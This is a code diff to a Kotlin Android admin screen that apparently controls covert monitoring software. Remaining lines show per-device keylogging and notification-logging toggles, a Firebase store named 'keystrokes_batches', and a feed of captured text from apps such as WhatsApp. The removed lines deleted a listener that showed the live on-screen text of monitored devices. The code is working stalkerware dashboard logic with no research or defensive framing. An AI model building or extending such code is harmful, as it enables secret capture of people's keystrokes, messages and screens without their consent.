@@ -33,7 +33,6 @@ class AdminMainActivity : AppCompatActivity() {
         val name: String,
         var keylogging: Boolean = true,
         var notifications: Boolean = true,
-        var liveScreenState: String = "Live Screen: Waiting...",
         var isExpanded: Boolean = false,
         var logFeed: String = "Waiting for device activity..."
     )
@@ -87,10 +86,8 @@ class AdminMainActivity : AppCompatActivity() {
                         deviceList.add(device)
                         listenToDeviceState(deviceName)
                         listenToDeviceLogs(deviceName)
-                        listenToLiveScreen(deviceName)
                     }
                     for (appChild in child.children) {
-                        if (appChild.key == "live_screen") continue
                         for (entry in appChild.children) {
                             totalEvents++
                         }
@@ -155,25 +152,6 @@ class AdminMainActivity : AppCompatActivity() {
         })
     }
 
-    private fun listenToLiveScreen(deviceName: String) {
-        val teleRef = FirebaseDatabase.getInstance().getReference("keystrokes_batches").child(deviceName).child("live_screen")
-        teleRef.addValueEventListener(object : ValueEventListener {
-            override fun onDataChange(snapshot: DataSnapshot) {
-                val screenText = snapshot.child("screenText").getValue(String::class.java)
-                val pkg = snapshot.child("packageName").getValue(String::class.java) ?: ""
-                val prettyApp = getPrettyAppName(pkg)
-
-                val index = deviceList.indexOfFirst { it.name == deviceName }
-                if (index != -1 && !screenText.isNullOrBlank()) {
-                    deviceList[index].liveScreenState = "Live Screen [$prettyApp]: $screenText"
-                    adapter.notifyItemChanged(index)
-                }
-            }
-
-            override fun onCancelled(error: DatabaseError) {}
-        })
-    }
-
     private fun getPrettyAppName(pkg: String): String {
         return when {
             pkg.contains("whatsapp", true) -> "WhatsApp"
@@ -201,7 +179,6 @@ class AdminMainActivity : AppCompatActivity() {
                 for (appChild in snapshot.children) {
                     val rawApp = appChild.key ?: continue
                     if (rawApp.startsWith("notification_", true)) continue
-                    if (rawApp == "live_screen") continue
                     val prettyApp = getPrettyAppName(rawApp)
                     for (entry in appChild.children) {
                         val text = entry.child("text").getValue(String::class.java)
@@ -250,7 +227,6 @@ class AdminMainActivity : AppCompatActivity() {
             val btnNotif: Button = view.findViewById<Button>(R.id.btnToggleNotifLog)
             val txtLog: TextView = view.findViewById<TextView>(R.id.txtDeviceLogConsole)
             val scrollView: View = view.findViewById<View>(R.id.logScrollView)
-            val txtLiveScreenState: TextView = view.findViewById<TextView>(R.id.txtLiveScreenState)
             val layoutDeviceHeader: View = view.findViewById<View>(R.id.layoutDeviceHeader)
             val layoutLogContainer: View = view.findViewById<View>(R.id.layoutLogContainer)
         }
@@ -279,9 +255,6 @@ class AdminMainActivity : AppCompatActivity() {
                 holder.btnNotif.text = "NOTIF_LOG: OFF"
                 holder.btnNotif.setBackgroundResource(R.drawable.btn_red_rounded)
             }
-
-            // Bind Live Screen State
-            holder.txtLiveScreenState.text = device.liveScreenState
 
             // Collapse/Expand log area based on click on device header
             if (device.isExpanded) {
